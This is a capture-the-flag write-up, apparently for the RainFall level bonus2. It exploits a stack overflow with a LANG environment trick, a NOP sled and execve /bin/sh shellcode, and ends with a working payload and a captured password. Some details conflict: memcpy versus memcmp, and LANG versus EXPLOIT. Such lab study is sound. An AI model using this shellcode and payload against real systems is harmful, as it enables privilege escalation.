A segfault occurs here:

```c
(gdb) run $(python -c 'print "A" * 40') $(python -c 'print "B" * 40')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 40')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
```

We manage to rewrite a portion of EIP with the second argument, but not the first.

However, we can achieve this by setting the LANG environment variable to `nl`.

It also works with export `LANG=nlsalutsalut` since memcpy only checks the first two characters.

```c
    else if ( !memcmp(env_var, "nl", 2u) )
    {
      language = 2;
    }
```

```nasm
bonus2@RainFall:~$ export LANG=nlsalutsalut
bonus2@RainFall:~$ gdb ./bonus2 
...
(gdb) run $(python -c 'print "A" * 40') $(python -c 'print "B" * 40')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 40')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

So, I'm going to attempt to place a shellcode after "nl", just like with bonus0. However, we still need to know the offset of the second argument. As always, we use:  https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

```c
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()
```

We have an offset of 23.

So, we change the environment variable like this, with some NOP instructions and the shellcode:

```c
bonus2@RainFall:~$ export LANG=nl$(python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

We run gdb to find the address of the environment variable:

```nasm
Breakpoint 1, 0x0804852f in main ()
(gdb) x/200s environ
...
0xbffff888:	 "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v\315\200"
...
(gdb) x/30x 0xbffff888
0xbffff888:	0x45	0x58	0x50	0x4c	0x4f	0x49	0x54	0x3d
0xbffff890:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff898:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8a0:	0x90	0x90	0x90	0x90	0x90	0x90
```

We'll try to find a middle ground in the NOPs with the address: `0xbffff898`

And here's the winning payload!

```
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\x98\xf8\xff\xbf" + "A" * 20')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAA
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```